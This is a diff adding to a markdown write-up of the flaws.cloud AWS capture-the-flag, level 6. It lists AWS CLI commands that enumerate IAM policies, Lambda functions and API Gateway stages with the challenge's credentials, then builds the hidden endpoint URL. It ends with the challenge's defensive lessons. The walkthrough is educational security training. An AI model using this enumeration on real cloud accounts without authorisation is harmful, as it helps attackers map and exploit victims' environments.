@@ -49,7 +49,7 @@ A similar problem to getting access to the IAM profile's access keys is access t
 Avoiding this mistake
 Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. Additionally, ensure that IAM roles are restricted as much as possible.
 
-# Level 6:
+# Level 6: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff
 - Get Username: `aws --profile level6 iam get-user` : Level6
 - Get attached inline polices to this user: `aws iam list-attached-user-policies --user-name Level6 --profile level6`: list_apigateways, MySecurityAudit
 - Get version to get detail about policy:
@@ -62,3 +62,18 @@ Ensure your applications do not allow access to 169.254.169.254 or any local and
 
 - List lambda function: `aws lambda list-functions --profile level6`
 - get policy details:  `aws --profile level6 lambda get-policy --function-name Level6`. Because the MySecurityAudit policy allow this :D
+`{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}", 
+    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
+}
+`
+--> The `rest-api-id` is `s33ppypa75`
+--> Next, using this command `aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6` to get stage.
+- The REST APIs will look like: `https://{restapi_id}.execute-api.{region}.amazonaws.com/{stage_name}/`
+--> the final url is: https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
+
+`Lesson learned`
+It is common to give people and entities read-only permissions such as the SecurityAudit policy. The ability to read your own and other's IAM policies can really help an attacker figure out what exists in your environment and look for weaknesses and mistakes.
+`Avoiding this mistake`
+Don't hand out any permissions liberally, even permissions that only let you read meta-data or know what your permissions are.`
